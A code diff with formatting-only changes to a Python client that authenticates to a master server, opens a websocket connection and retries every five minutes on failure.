@@ -1,14 +1,15 @@
 import json
 import subprocess
+import time
+from threading import Thread
+
 import requests
 from websocket import WebSocketApp
-import time
-import os
-from threading import Thread
 
 MASTER_URL = "vluxm.irsuniversity.space"
 PORT = "8000"
 WS_TOKEN = ""
+
 
 def add_user_with_password(username, password):
     try:
@@ -105,14 +106,16 @@ def start_websocket():
     ws_thread.start()
     return websocket
 
+
 def get_ws_token():
     response = requests.post(f"http://{MASTER_URL}:{PORT}/ws/auth/").json()
     return response["access_token"]
 
+
 while True:
     try:
         WS_TOKEN = get_ws_token()
-        if WS_TOKEN == "": 
+        if WS_TOKEN == "":
             print("Token not valid")
             raise Exception("Token not valid")
         ws = start_websocket()
@@ -122,7 +125,6 @@ while True:
         break
     except:
         time.sleep(60 * 5)
-
 
 # master_stats_thread = Thread(target=send_stats_mto_master, args=(ws,))
 # master_stats_thread.start()
